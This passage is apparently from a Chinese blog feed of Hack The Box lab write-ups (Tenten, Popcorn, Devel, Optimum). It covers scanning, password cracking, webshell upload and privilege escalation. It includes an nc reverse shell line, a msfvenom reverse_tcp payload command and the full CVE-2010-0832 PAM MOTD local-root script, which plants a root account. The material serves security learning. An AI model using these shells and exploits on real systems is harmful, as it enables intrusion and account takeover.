id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h3><p>使用 <code>dirbuster</code> 工具，得到以下结果：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906144201.png-water_print" alt=""></p><p>发现了一个 <code>plugins</code> 目录，由于正常的 wp 插件目录存放在 <code>wp-content/plugins</code> 下，访问</p><p>该目录，得到两个 <code>jar</code> 包：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906144339.png-water_print" alt=""></p><p>将 jar 包下载到本地，反编译，得到数据库的用户名的密码：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906144431.png-water_print" alt=""></p><p>尝试使用该密码登录 <code>phpmyadmin</code>，发现成功登录：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906144525.png-water_print" alt=""></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>在现有的基础上，尝试使用 <code>sql语句</code> 读文件，首先查看可读目录的范围：</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">show</span> <span class="token keyword">GLOBAL</span> VARIABLES <span class="token operator">like</span> <span class="token string">"%secure_file_priv"</span></code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906144733.png-water_print" alt=""></p><p>但是目录被限制，转而其它思路。</p><p>想到密码可能重复利用，遂利用 <code>notch</code> 账户和 <code>mysql</code> 的密码登录 <code>ssh</code>。</p><p>发现可以登录。</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906145108.png-water_print" alt=""></p><p>查看 user.txt 获得第一个 flag。</p><p>尝试权限提升，但是试了好多方法都不行，突然想到再次用相同的密码切到 root 用户，发现成功切到 root。</p><p>查看 <code>root.txt</code>，得到第二个 flag。</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906145332.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Hack The Box </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hack The Box </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hack The Box —— Tenten</title>
      <link href="/2019/09/05/hackthebox-tenten/"/>
      <url>/2019/09/05/hackthebox-tenten/</url>
      
        <content type="html"><![CDATA[<h1 id="Hack-The-Box-——-Tenten"><a href="#Hack-The-Box-——-Tenten" class="headerlink" title="Hack The Box —— Tenten"></a>Hack The Box —— Tenten</h1><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190905155646.png-water_print" alt=""></p><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><pre><code>nmap -T4 -A -v 10.10.10.6</code></pre><p>发现服务器开了 <code>22</code> 端口和 <code>80</code> 端口浏览器访问 <code>http</code> 服务，发现 <code>wordpress</code> 站点。</p><h3 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h3><p>利用 <code>wpscan</code> 工具扫描一波 wordpress 站的信息：</p><pre><code>wpscan --enumerate t --enumerate p --enumerate u --url=http://10.10.10.10/</code></pre><p>发现用户名：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190905160043.png-water_print" alt=""></p><p>插件漏洞：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190905160104.png-water_print" alt=""></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>搜索 <code>Job-Manager</code> 相关漏洞，发现<a href="https://vagmour.eu/cve-2015-6668-cv-filename-disclosure-on-job-manager-wordpress-plugin/" target="_blank" rel="noopener"></a>，用户可以利用该插件可以上传 CV。由于 <code>wordpress</code> 上传的文件存放在 <code>upload/year/month/filename</code> 下，因此可以爆破出上传的 CV 文件，从而造成信息泄漏。</p><p>首先访问 <code>Jobs Listing</code>：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190905161223.png-water_print" alt=""></p><p>在 <code>apply now</code> 下获取 <code>job</code> 详细信息：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190905161402.png-water_print" alt=""></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190905161501.png-water_print" alt=""></p><p>更改 url 中的 number 值，可以得到其它的 <code>JOB APPLICATION</code>，<br>使用如下命令，枚举 <code>job title</code>：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190905161711.png-water_print" alt=""></p><p>发现 <code>HackerAccessGranted</code> title，尝试使用 exp 进行用户上传 cv 的枚举：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">print</span> <span class="token triple-quoted-string string">"""  CVE-2015-6668  Title: CV filename disclosure on Job-Manager WP Plugin  Author: Evangelos Mourikis  Blog: https://vagmour.eu  Plugin URL: http://www.wp-jobmanager.com  Versions: &lt;=0.7.25  """</span>  website <span class="token operator">=</span> raw_input<span class="token punctuation">(</span><span class="token string">'Enter a vulnerable website: '</span><span class="token punctuation">)</span>  filename <span class="token operator">=</span> raw_input<span class="token punctuation">(</span><span class="token string">'Enter a file name: '</span><span class="token punctuation">)</span>filename2 <span class="token operator">=</span> filename<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">"-"</span><span class="token punctuation">)</span><span class="token keyword">for</span> year <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">2016</span><span class="token punctuation">,</span><span class="token number">2019</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> extension <span class="token keyword">in</span> <span class="token punctuation">{</span><span class="token string">'php'</span><span class="token punctuation">,</span><span class="token string">'html'</span><span class="token punctuation">,</span><span class="token string">'pdf'</span><span class="token punctuation">,</span><span class="token string">'png'</span><span class="token punctuation">,</span><span class="token string">'gif'</span><span class="token punctuation">,</span><span class="token string">'jpg'</span><span class="token punctuation">,</span><span class="token string">'jpeg'</span><span class="token punctuation">}</span><span class="token punctuation">:</span>            URL <span class="token operator">=</span> website <span class="token operator">+</span> <span class="token string">"/wp-content/uploads/"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>year<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"/"</span> <span class="token operator">+</span> <span class="token string">"{:02}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"/"</span> <span class="token operator">+</span> filename2 <span class="token operator">+</span> <span class="token string">"."</span> <span class="token operator">+</span> extension            <span class="token keyword">print</span> URL            req <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>URL<span class="token punctuation">)</span>            <span class="token keyword">if</span> req<span class="token punctuation">.</span>status_code<span class="token operator">==</span><span class="token number">200</span><span class="token punctuation">:</span>                <span class="token keyword">print</span> <span class="token string">"[+] URL of CV found! "</span> <span class="token operator">+</span> URL</code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190905161950.png-water_print" alt=""></p><p>发现如下敏感文件：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190905162035.png-water_print" alt=""></p><p>访问，得到一张图片。<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190905162105.jpg-water_print" alt=""></p><p>猜测图片隐写，使用 <code>steghide extract -sf HackerAccessGranted.jpg</code>，得到 <code>id_rsa</code> 文件。</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190905162242.png-water_print" alt=""></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190905162345.png-water_print" alt="id_rsa文件内容"></p><p>打开 <code>id_rsa</code> 文件，发现该文件被加密：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190905162314.png-water_print" alt=""></p><p>使用 <code>ssh2john</code> 脚本文件将加密的内容转化为 john 可以破解的文件</p><pre class=" language-bash"><code class="language-bash">python2 ssh2john id_rsa <span class="token operator">></span> ssh_login</code></pre><p>得到：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190905162833.png-water_print" alt=""></p><p>使用 john 进行密码破解：</p><pre class=" language-bash"><code class="language-bash">john ssh_login --wordlist<span class="token operator">=</span>rockyou.txt</code></pre><p>得到 id_rsa 的密码：<code>superpassword</code>。</p><p>尝试登录服务器：</p><pre><code>ssh -i id_rsa takis@10.10.10.10</code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190905163056.png-water_print" alt=""></p><p>得到第一个 <code>flag</code>。</p><p>尝试进入 root 目录，发现权限不足。<br>使用 <code>sudo -l</code> 命令，查看无需密码课执行的命令：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190905163351.png-water_print" alt=""></p><p>发现 <code>/bin/fuckin</code> 文件，查看文件内容：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190905163512.png-water_print" alt=""></p><p>执行：<code>sudo /bin/fuckin /bin/bash</code>，即可获得 root 权限：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190905163635.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Hack The Box </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hack The Box </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hack The Box —— Popcorn</title>
      <link href="/2019/09/04/hackthebox-popcorn/"/>
      <url>/2019/09/04/hackthebox-popcorn/</url>
      
        <content type="html"><![CDATA[<h1 id="Hack-The-Box-——-Popcorn"><a href="#Hack-The-Box-——-Popcorn" class="headerlink" title="Hack The Box —— Popcorn"></a>Hack The Box —— Popcorn</h1><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904190902.png-water_print" alt=""></p><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><pre><code>nmap -T4 -A -v 10.10.10.6</code></pre><p>发现服务器开了 <code>22</code> 端口和 <code>80</code> 端口浏览器访问 <code>http</code> 服务，发现 只有 <code>apache</code> 的默认页面。</p><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p>利用 <code>dirsearch</code> 工具扫描一波目录：</p><pre><code>python3 dirsearch -u http://10.10.10.6 -e html</code></pre><p>发现 <code>test.php</code> 页面和 <code>torrent</code> 目录，针对 <code>torrent</code> 目录进行目录扫描，发现 <code>upload</code> 上传目录可以访问，同时存在 index.php 页面。</p><h3 id="功能点搜索"><a href="#功能点搜索" class="headerlink" title="功能点搜索"></a>功能点搜索</h3><p>该网站为 bt 种子论坛站，注册用户，发现上传页面。<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904191408.png-water_print" alt=""></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904191435.png-water_print" alt=""></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>在上传点尝试上传 webshell，发现失败，猜测程序检测上传的文件是否为标准的 <code>bt</code> 种子文件，且并未绕过过滤。<br>继续上传正常的 <code>bt</code> 种子文件，进行进一步测试:</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904191857.png-water_print" alt=""></p><p>发现在上传好的种子页面存在 screenshots 图标上传点，</p><p>尝试上传 <code>webshell</code>，发现成功上传。</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904192051.png-water_print" alt=""></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904192134.png-water_print" alt=""></p><p>访问 <code>upload</code> 目录，得到 <code>webshell</code> 的地址：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904192256.png-water_print" alt=""></p><p>菜刀连接：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904192316.png-water_print" alt=""></p><p>成功获取 user 的 flag。<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904192325.png-water_print" alt=""></p><p>同时在 <code>home</code> 目录下发现 <code>.cache</code> 文件夹，进入后发现 <code>motd.legal-displayed</code> 文件。</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904192449.png-water_print" alt=""></p><p>利用搜索引擎搜索相关文档，发现：<br><a href="https://www.exploit-db.com/exploits/14339" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/14339</a></p><p>利用虚拟终端反弹一个 <code>shell</code> 到本地，便于提权操作。</p><p>本机： <code>nc -l 4444</code><br>受害机：<code>nc -e /bin/bash 10.10.14.10 4444</code></p><p>利用菜刀上传 <code>exp</code> 脚本:</p><pre class=" language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true"># Exploit Title: Ubuntu PAM MOTD local root</span><span class="token comment" spellcheck="true"># Date: July 9, 2010</span><span class="token comment" spellcheck="true"># Author: Anonymous</span><span class="token comment" spellcheck="true"># Software Link: http://packages.ubuntu.com/</span><span class="token comment" spellcheck="true"># Version: pam-1.1.0</span><span class="token comment" spellcheck="true"># Tested on: Ubuntu 9.10 (Karmic Koala), Ubuntu 10.04 LTS (Lucid Lynx)</span><span class="token comment" spellcheck="true"># CVE: CVE-2010-0832</span><span class="token comment" spellcheck="true"># Patch Instructions: sudo aptitude -y update; sudo aptitude -y install libpam~n~i</span><span class="token comment" spellcheck="true"># References: http://www.exploit-db.com/exploits/14273/ by Kristian Erik Hermansen</span>P<span class="token operator">=</span><span class="token string">'toor:x:0:0:root:/root:/bin/bash'</span>S<span class="token operator">=</span><span class="token string">'toor:<span class="token variable">$6</span><span class="token variable">$tPuRrLW7</span><span class="token variable">$m0BvNoYS9FEF9</span>/Lzv6PQospujOKt0giv.7JNGrCbWC1XdhmlbnTWLKyzHz.VZwCcEcYQU5q2DLX.cI7NQtsNz1:14798:0:99999:7:::'</span><span class="token keyword">echo</span> <span class="token string">"[*] Ubuntu PAM MOTD local root"</span><span class="token punctuation">[</span> -z <span class="token string">"<span class="token variable"><span class="token variable">$(</span><span class="token function">which</span> <span class="token function">ssh</span><span class="token variable">)</span></span>"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">echo</span> <span class="token string">"[-] ssh is a requirement"</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">exit</span> 1<span class="token punctuation">[</span> -z <span class="token string">"<span class="token variable"><span class="token variable">$(</span><span class="token function">which</span> ssh-keygen<span class="token variable">)</span></span>"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">echo</span> <span class="token string">"[-] ssh-keygen is a requirement"</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">exit</span> 1<span class="token punctuation">[</span> -z <span class="token string">"<span class="token variable"><span class="token variable">$(</span><span class="token function">ps</span> -u root <span class="token operator">|</span><span class="token function">grep</span> sshd<span class="token variable">)</span></span>"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">echo</span> <span class="token string">"[-] a running sshd is a requirement"</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">exit</span> 1backup<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">[</span> -e <span class="token string">"<span class="token variable">$1</span>"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">[</span> -e <span class="token string">"<span class="token variable">$1</span>"</span>.bak <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">rm</span> -rf <span class="token string">"<span class="token variable">$1</span>"</span>.bak    <span class="token punctuation">[</span> -e <span class="token string">"<span class="token variable">$1</span>"</span> <span class="token punctuation">]</span> <span class="token operator">||</span> <span class="token keyword">return</span> 0    <span class="token function">mv</span> <span class="token string">"<span class="token variable">$1</span>"</span><span class="token punctuation">{</span>,.bak<span class="token punctuation">}</span> <span class="token operator">||</span> <span class="token keyword">return</span> 1    <span class="token keyword">echo</span> <span class="token string">"[*] Backuped <span class="token variable">$1</span>"</span><span class="token punctuation">}</span>restore<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">[</span> -e <span class="token string">"<span class="token variable">$1</span>"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">rm</span> -rf <span class="token string">"<span class="token variable">$1</span>"</span>    <span class="token punctuation">[</span> -e <span class="token string">"<span class="token variable">$1</span>"</span>.bak <span class="token punctuation">]</span> <span class="token operator">||</span> <span class="token keyword">return</span> 0    <span class="token function">mv</span> <span class="token string">"<span class="token variable">$1</span>"</span><span class="token punctuation">{</span>.bak,<span class="token punctuation">}</span> <span class="token operator">||</span> <span class="token keyword">return</span> 1    <span class="token keyword">echo</span> <span class="token string">"[*] Restored <span class="token variable">$1</span>"</span><span class="token punctuation">}</span>key_create<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    backup ~/.ssh/authorized_keys    ssh-keygen -q -t rsa -N <span class="token string">''</span> -C <span class="token string">'pam'</span> -f <span class="token string">"<span class="token variable">$KEY</span>"</span> <span class="token operator">||</span> <span class="token keyword">return</span> 1    <span class="token punctuation">[</span> <span class="token operator">!</span> -d ~/.ssh <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">{</span> <span class="token function">mkdir</span> ~/.ssh <span class="token operator">||</span> <span class="token keyword">return</span> 1<span class="token punctuation">;</span> <span class="token punctuation">}</span>    <span class="token function">mv</span> <span class="token string">"<span class="token variable">$KEY</span>.pub"</span> ~/.ssh/authorized_keys <span class="token operator">||</span> <span class="token keyword">return</span> 1    <span class="token keyword">echo</span> <span class="token string">"[*] SSH key set up"</span><span class="token punctuation">}</span>key_remove<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">rm</span> -f <span class="token string">"<span class="token variable">$KEY</span>"</span>    restore ~/.ssh/authorized_keys    <span class="token keyword">echo</span> <span class="token string">"[*] SSH key removed"</span><span class="token punctuation">}</span>own<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">[</span> -e ~/.cache <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">rm</span> -rf ~/.cache    <span class="token function">ln</span> -s <span class="token string">"<span class="token variable">$1</span>"</span> ~/.cache <span class="token operator">||</span> <span class="token keyword">return</span> 1    <span class="token keyword">echo</span> <span class="token string">"[*] spawn ssh"</span>    <span class="token function">ssh</span> -o <span class="token string">'NoHostAuthenticationForLocalhost yes'</span> -i <span class="token string">"<span class="token variable">$KEY</span>"</span> localhost <span class="token boolean">true</span>    <span class="token punctuation">[</span> -w <span class="token string">"<span class="token variable">$1</span>"</span> <span class="token punctuation">]</span> <span class="token operator">||</span> <span class="token punctuation">{</span> <span class="token keyword">echo</span> <span class="token string">"[-] Own <span class="token variable">$1</span> failed"</span><span class="token punctuation">;</span> restore ~/.cache<span class="token punctuation">;</span> bye<span class="token punctuation">;</span> <span class="token punctuation">}</span>    <span class="token keyword">echo</span> <span class="token string">"[+] owned: <span class="token variable">$1</span>"</span><span class="token punctuation">}</span>bye<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    key_remove    <span class="token keyword">exit</span> 1<span class="token punctuation">}</span>KEY<span class="token operator">=</span><span class="token string">"<span class="token variable"><span class="token variable">$(</span>mktemp -u<span class="token variable">)</span></span>"</span>key_create <span class="token operator">||</span> <span class="token punctuation">{</span> <span class="token keyword">echo</span> <span class="token string">"[-] Failed to setup SSH key"</span><span class="token punctuation">;</span> <span class="token keyword">exit</span> 1<span class="token punctuation">;</span> <span class="token punctuation">}</span>backup ~/.cache <span class="token operator">||</span> <span class="token punctuation">{</span> <span class="token keyword">echo</span> <span class="token string">"[-] Failed to backup ~/.cache"</span><span class="token punctuation">;</span> bye<span class="token punctuation">;</span> <span class="token punctuation">}</span>own /etc/passwd <span class="token operator">&amp;&amp;</span> <span class="token keyword">echo</span> <span class="token string">"<span class="token variable">$P</span>"</span> <span class="token operator">>></span> /etc/passwdown /etc/shadow <span class="token operator">&amp;&amp;</span> <span class="token keyword">echo</span> <span class="token string">"<span class="token variable">$S</span>"</span> <span class="token operator">>></span> /etc/shadowrestore ~/.cache <span class="token operator">||</span> <span class="token punctuation">{</span> <span class="token keyword">echo</span> <span class="token string">"[-] Failed to restore ~/.cache"</span><span class="token punctuation">;</span> bye<span class="token punctuation">;</span> <span class="token punctuation">}</span>key_remove<span class="token keyword">echo</span> <span class="token string">"[+] Success! Use password toor to get root"</span><span class="token function">su</span> -c <span class="token string">"sed -i '/toor:/d' /etc/{passwd,shadow}; chown root: /etc/{passwd,shadow}; \  chgrp shadow /etc/shadow; nscd -i passwd >/dev/null 2>&amp;1; bash"</span> toor</code></pre><p>并给该脚本赋予执行权限：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">chmod</span> + x 1.sh</code></pre><p>执行脚本，获得 root 权限：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904194200.png-water_print" alt=""></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904194204.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Hack The Box </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hack The Box </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hack The Box —— Devel</title>
      <link href="/2019/08/14/hackthebox-devel/"/>
      <url>/2019/08/14/hackthebox-devel/</url>
      
        <content type="html"><![CDATA[<h1 id="Hack-The-Box-——-Devel"><a href="#Hack-The-Box-——-Devel" class="headerlink" title="Hack The Box —— Devel"></a>Hack The Box —— Devel</h1><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190814162131.png-water_print" alt=""></p><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><pre><code>nmap -T4 -A -v 10.10.10.5</code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190814162312.png-water_print" alt=""></p><p>发现服务器开了 <code>21</code> 端口和 <code>80</code> 端口，同时 <code>ftp</code> 服务可以匿名访问，但是不知道版本号。浏览器访问 <code>http</code> 服务，发现 只有 <code>iis</code> 的默认页面。</p><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p>利用 <code>dirsearch</code> 工具扫描一波目录：</p><pre><code>python3 dirsearch -u http://10.10.10.5 -e html</code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190814162625.png-water_print" alt=""></p><p>并未有什么特殊的发现。</p><h3 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h3><p>匿名访问 <code>FTP</code> 服务，发现当前目录下有写权限，所以，想通过上传 <code>webshell</code> 的方式获取服务器的权限。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><p>首先上传 <code>aspx</code> 的 webshell：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190814163112.png-water_print" alt=""></p><p>浏览器访问，发现 webshell 未报错，可以执行。</p><p>用蚁剑链接:</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190814163228.png-water_print" alt=""></p><p>访问一些目录，发现权限不足。</p><p>利用蚁剑的<code>虚拟终端</code>，执行 <code>whoami</code> ，发现只有 <code>iis user</code> 的权限，遂想办法提权。</p><h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>利用 <code>msfvenom</code> 生成 exe 木马文件，使用 msf 接收到回连的 shell，方便提权。</p><pre class=" language-bash"><code class="language-bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>10.10.14.10 LPORT<span class="token operator">=</span>4444 -f exe <span class="token operator">></span> shell.exe</code></pre><p>然后将生成的 <code>shell.exe</code> 文件通过蚁剑上传到目标服务器上，并通过虚拟终端执行。</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190814164149.png-water_print" alt=""></p><p>使用 msf 监听端口，接收回连的 shell :</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190814164258.png-water_print" alt=""></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190814165547.png-water_print" alt=""></p><p>使用 msf 自带的检测脚本，查看可能用于提权的漏洞：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190814164414.png-water_print" alt=""></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190814170651.png-water_print" alt=""></p><p>经过一个一个的测试：发现 ms10-015可以用来提权。</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190814164518.png-water_print" alt=""></p><p>成功创建了一个新的 session.</p><p>在 meterpreter 下执行 getuid 命令：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190814170812.png-water_print" alt=""></p><p>发现成功提权。</p><p>接下来就可以 <code>type c:\users\Administrator\Desktop\root.txt.txt</code> 获取 <code>flag</code> 了。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Hack The Box </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hack The Box </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hack The Box —— Optimum</title>
      <link href="/2019/08/13/hackthebox-optimum/"/>
      <url>/2019/08/13/hackthebox-optimum/</url>
      
        <content type="html"><![CDATA[<h1 id="Hack-The-Box-——-Lame"><a href="#Hack-The-Box-——-Lame" class="headerlink" title="Hack The Box —— Lame"></a>Hack The Box —— Lame</h1><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190813163044.png-water_print" alt=""></p><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><pre class=" language-bash"><code class="language-bash">nmap -T4 -A -v 10.10.10.8</code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190813163152.png-water_print" alt="扫描结果"></p><p>发现服务器只开了 <code>80</code> 端口，对应 <code>hfs</code> 服务，浏览器访问，发现 hfs 服务的版本号。</p><h3 id="exploit-db"><a href="#exploit-db" class="headerlink" title="exploit-db"></a>exploit-db</h3><p>搜索相关漏洞，发现在 <code>msf</code> 上有对应的 <code>exp</code></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190813163541.png-water_print" alt=""></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><code>msf</code> 下使用 <code>use exploit/windows/http/rejetto_hfs_exec</code>，并配置 <code>meterpreter</code> payload。</p><p><code>exploit</code> 运行，成功反弹 <code>meterpreter</code> shell</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190813163807.png-water_print" alt=""></p><p><code>sysinfo</code> 上显示该系统是 64 位的，但是我们默认用的 <code>meterpreter</code> payload 是 32 位的，所以将 meterpreter 转移到 64 位的进程上，如 <code>explorer.exe</code> </p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190813163942.png-water_print" alt=""></p><p>直接查看当前目录，发现 <code>user.txt</code> ，type 一下 